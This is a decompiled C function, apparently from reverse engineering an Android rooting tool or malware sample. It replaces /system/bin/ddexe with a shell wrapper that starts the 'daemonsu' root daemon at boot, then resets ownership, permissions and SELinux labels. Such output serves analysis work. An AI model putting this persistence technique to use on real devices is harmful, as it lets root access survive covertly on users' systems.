
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void switch_file_ddexe_persistence_(void)

{
  int fd_ddexe;
  ssize_t sVar1;
  size_t __n;
  char local_a;
  char local_9;
  long local_8;
  
  local_8 = ___stack_chk_guard;
  if ((systemless_sdk != 0) ||
     (fd_ddexe = get_information_binary("/system/bin/ddexe"), fd_ddexe == 0)) goto LAB_0010fbf4;
  fd_ddexe = open("/system/bin/ddexe",0);
  if (fd_ddexe < 0) {
LAB_0010fc64:
    like_copy_content_file("/system/bin/ddexe","/system/bin/ddexe_real");
  }
  else {
    sVar1 = read(fd_ddexe,&local_a,1);
    if ((sVar1 != 1) || (sVar1 = read(fd_ddexe,&local_9,1), sVar1 != 1)) {
      close(fd_ddexe);
      goto LAB_0010fc64;
    }
    if ((local_a != '#') || (local_9 != '!')) goto LAB_0010fc64;
    close(fd_ddexe);
  }
  fd_ddexe = get_information_binary("/system/bin/ddexe_real");
  if (fd_ddexe != 0) {
    unlink("/system/bin/ddexe");
    fd_ddexe = open("/system/bin/ddexe",193,493);
    if (-1 < fd_ddexe) {
      fchown(fd_ddexe,0,2000);
      __n = strlen(
                  "#!/system/bin/sh\n/system/xbin/daemonsu --auto-daemon &\n/system/bin/ddexe_real\n"
                  );
      write(fd_ddexe,
            "#!/system/bin/sh\n/system/xbin/daemonsu --auto-daemon &\n/system/bin/ddexe_real\n",__n)
      ;
      close(fd_ddexe);
    }
  }
  chown("/system/bin/ddexe",0,2000);
  chmod("/system/bin/ddexe",0x1ed);
  change_selinux_toyboxORtoolbox("/system/bin/ddexe");
  chown("/system/bin/ddexe_real",0,2000);
  chmod("/system/bin/ddexe_real",0x1ed);
  change_selinux_toyboxORtoolbox("/system/bin/ddexe_real");
LAB_0010fbf4:
  if (local_8 == ___stack_chk_guard) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

